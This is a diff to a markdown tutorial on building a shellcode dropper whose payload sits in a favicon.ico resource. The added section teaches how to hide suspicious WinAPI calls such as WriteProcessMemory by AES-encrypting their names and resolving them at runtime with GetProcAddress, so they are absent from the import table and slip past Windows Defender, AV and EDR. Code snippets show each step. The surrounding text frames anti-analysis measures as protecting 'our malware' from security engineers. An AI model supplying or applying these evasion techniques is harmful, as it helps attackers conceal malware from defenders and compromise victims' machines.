@@ -92,15 +92,75 @@ Looking at our folder we can now see a favicon.ico file (which stored our shellc
 
 ## Add AES paylod Encryption
 
-2) `Add AES paylod Encryption`
+2) `AES paylod Encryption`
+
+One of the main problem with the current dropper is the utilization of well known WinAPI functions. 
+The combination of `Find/Load/LockResource`, `VirtualAlloc`, `RtlMoveMemory`, `VirtualProtect`, and `CreateThread` has been in countless malware for many, many years. 
+It is no wonder that Windows Defender, AV, and EDR solutions are not a big fan of these WIN-API call.
+
+One way to get around this is using function call obfuscation. 
+Function call obfuscation is a method that I learned from Sektor7's course, which is a great introductory course on custom tool creation. 
+Although, I had to sink some time researching how to do function obfuscation in visual c++ (for visual studio).
+
+So in order to accomplish this we will implement the following steps: 
+
+1) Create a WinAPI function pointer struct which has the same parameters as the function to be obfuscated
+2) Create a char array with the function's name AES encrypted
+3) Using GetProcAddress and GetModuleHandleA, get the function pointer of the export DLL
+4) Now, call the function pointer created in #1 instead of calling the actual function
+
+Let's go through an example. Let's say we want to obfuscate the function WriteProcessMemory.
+
+First, create a struct of WINAPI function pointer with the name pWriteProcessMemory.
+
+```cpp
+  BOOL (WINAPI * pWriteProcessMemory)(
+  HANDLE  hProcess,
+  LPVOID  lpBaseAddress,
+  LPCVOID lpBuffer,
+  SIZE_T  nSize,
+  SIZE_T  *lpNumberOfBytesWritten
+);
+```
+
+Second, create a char array with the function name WriteProcessMemory AES encrypted with a specific key. 
+In this case, the key "yoyo" was used.
+
+```cpp
+	c=aesenc("WriteProcessMemory\x00","yoyo")
+	print('payload[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in c) + ' };')
+	payload[] = { 0xac, 0x3c, 0xa9, 0x7f, 0x9, 0x25, 0xe2, 0x98, 0x6b, 0xa8, 0xa7, 0xab, 0xb5, 0xf, 0x87, 0x8d, 0xd8, 0x5b, 0x37, 0xf3, 0xa2, 0xd5, 0x93, 0x94, 0xd7, 0xfd, 0xac, 0xc6, 0x40, 0xc4, 0xf9, 0x13 };
+```
 
 
+
+Third, declare a char array with AES encrypted function name. 
+Then, AES decrypt the function's name in runtime. Make sure to use the same key "yoyo".
+
+```cpp
+unsigned char sWriteProcessMemory[] = { 0xac, 0x3c, 0xa9, 0x7f, 0x9, 0x25, 0xe2, 0x98, 0x6b, 0xa8, 0xa7, 0xab, 0xb5, 0xf, 0x87, 0x8d, 0xd8, 0x5b, 0x37, 0xf3, 0xa2, 0xd5, 0x93, 0x94, 0xd7, 0xfd, 0xac, 0xc6, 0x40, 0xc4, 0xf9, 0x13 };
+
+```
+
+Fourth, decrypt and retrieve the function pointer indirectly from kernel32.dll, using `GetProcAddress`.
+
+
+```cpp
+		AESDecrypt((char *) sWriteProcessMemory, sizeof(sWriteProcessMemory), key, sizeof(key));
+		pWriteProcessMemory = GetProcAddress(GetModuleHandle("kernel32.dll"), sWriteProcessMemory);
+```
+
+Now every time `WriteProcessMemory` is used, we can simply call `pWriteProcessMemory` function instead. 
+If we check out PEView or PEStudio and look at the import table, we can't find any of the obfuscated functions. 
+In this case, I obfuscated `WriteProcessMemory` and `LockResource`. 
+
+As a result, those functions don't show in the import table of the PE file.
 
 
 
 ## Anti analysis defenses
 
-3) `Anti analysis defenses`
+3) `Simple Anti analysis defenses`
 
 In order to protect our malware from being analyzed by security engenieer we will add some simple defenses tecniques used to protect our custom dropper. The objectives here, most of the time, is being able to detect if the malware is being opened in a __VirtualEnvironment__ like virtual box or any vistualization software. 
 
